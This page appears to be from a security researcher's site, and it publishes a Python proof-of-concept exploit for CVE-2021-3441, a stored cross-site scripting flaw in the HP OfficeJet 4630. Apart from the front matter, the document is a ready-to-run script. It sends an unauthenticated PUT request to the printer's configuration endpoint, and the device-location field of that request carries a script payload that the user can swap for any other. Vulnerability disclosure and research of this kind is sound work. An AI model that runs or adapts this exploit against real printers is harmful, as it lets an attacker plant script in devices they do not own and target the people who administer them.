---
layout: cve
title:  "CVE-2021-3441 Proof of Concept Exploit"
date: 2021-08-22 09:34:43 -0400
categories: "About"
author: Tyler Butler
description: Proof of concept exploit for CVE-2021-3441- HP OfficeJet 4630 Unauthenticated Stored Cross-Site Scripting (XSS)
lead: Proof of concept exploit for CVE-2021-3441- HP OfficeJet 4630 Unauthenticated Stored Cross-Site Scripting (XSS)
tag: poc 
language: python
advisory: /about/2021/08/22/CVE-2021-3441.html

hero:
  image: /assets/uswds/img/camera.jpg
  callout:
    alt: "HP OfficeJet"
    text: "‘AirPrint’ Cross Site Scripting (XSS)"
  button:
    href:
    text:
    number:
    enable: false
  link:
    text: Link to more about that priority
    href: /link/
  content: Obsrva disclosed a stored cross-site scripting vulnerability to printer manufacturer HP.
---  

```python
# Exploit Title: HP OfficeJet 4630 Unauthenticated Stored Cross-Site Scripting (XSS)
# Google Dork: NA
# Date: 01/08/2021
# Exploit Author: Tyler C Butler
#         twitter:  https://twitter.com/tbutler0x90
#         github:   https://github.com/tcbutler320
#         website:  https://tbutler.org/
#         Linkedin: https://www.linkedin.com/in/tyler-b-a700a1aa/
# Vendor Homepage: https://www8.hp.com/
# Software Link: https://support.hp.com/us-en/product/HP-Officejet-4600-e-All-in-One-printer-series/5305049/model/5305050
# Version: HP Officejet 4630 e-All-in-One Printer series model number B4L03A

# PoC:
import requests
import json
from requests.exceptions import HTTPError

target = 'http://192.168.223.1'   # The IP of the vulnerable taget 
payload = '''&lt;script&gt;alert('XSS');&lt;/script&gt;'''  # The XSS injection payload you want to use 
path='/DevMgmt/ProductConfigDyn.xml'   # Path location of the PUT command
pre = '''
<?xml version="1.0" encoding="UTF-8"?>
<!-- THIS DATA SUBJECT TO DISCLAIMER(S) INCLUDED WITH THE PRODUCT OF ORIGIN. -->
<prdcfgdyn2:ProductConfigDyn xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dd="http://www.hp.com/schemas/imaging/con/dictionaries/1.0/" xmlns:prdcfgdyn2="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2009/03/16" xmlns:prdcfgdyn="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2007/11/05" xsi:schemaLocation="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2009/03/16 ../schemas/ledm2/ProductConfigDyn.xsd                               http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2007/11/05 ../schemas/ProductConfigDyn.xsd                               http://www.hp.com/schemas/imaging/con/dictionaries/1.0/ ../schemas/dd/DataDictionaryMasterLEDM.xsd">
	<prdcfgdyn2:ProductSettings>
		<prdcfgdyn:DeviceInformation>
			<dd:DeviceLocation>
'''  # The start of the request body
post = '''
            </dd:DeviceLocation>
		</prdcfgdyn:DeviceInformation>
	</prdcfgdyn2:ProductSettings>	
</prdcfgdyn2:ProductConfigDyn>
'''   # The end of the request body 
body = pre + payload + post


headers = {
            'Host':'192.168.223.1', 
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0',
            'Accept':'*/*',
            'Accept-Language':'en-US,en;q=0.5',
            'Accept-Encoding':'gzip, deflate',
            'Content-Type':'text/xml',
            'Content-Length':str(len(body.encode('utf-8'))),
            'Origin':'https://192.168.223.1',
            'Connection':'close',
            'Referer':target,
        }

print('{!} Starting HP Officejet 4630 XSS Injector .... \n    Author: Tyler Butler\n    @tbutler0x90')
try:
    print('{!} Injecting payload :',payload)
    response = requests.put(target+path, headers = headers, data = body)
    response.raise_for_status()
except HTTPError as http_err:
    print('{X}',f'HTTP error occurred: {http_err}') 
except Exception as err:
    print('{X}',f'Other error occurred: {err}')
else:
    print('{!} Success!')
```